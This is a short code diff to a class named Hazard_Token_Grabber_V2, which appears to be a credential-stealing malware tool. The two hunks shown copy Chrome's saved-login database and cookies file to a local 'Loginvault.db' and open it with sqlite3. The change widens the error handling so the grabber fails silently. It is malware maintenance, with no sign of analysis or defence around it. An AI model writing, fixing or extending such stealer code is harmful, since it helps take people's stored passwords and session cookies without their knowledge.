@@ -211,7 +211,7 @@ class Hazard_Token_Grabber_V2:
         login_db = self.appdata+'\\Google\\Chrome\\User Data\\default\\Login Data'
         try:
             shutil.copy2(login_db, "Loginvault.db")
-        except FileNotFoundError:
+        except Exception:
             pass
         conn = sqlite3.connect("Loginvault.db")
         cursor = conn.cursor()
@@ -241,7 +241,7 @@ class Hazard_Token_Grabber_V2:
         login_db = self.appdata+'\\Google\\Chrome\\User Data\\default\\Network\\cookies'
         try:
             shutil.copy2(login_db, "Loginvault.db")
-        except FileNotFoundError:
+        except Exception:
             pass
         conn = sqlite3.connect("Loginvault.db")
         cursor = conn.cursor()
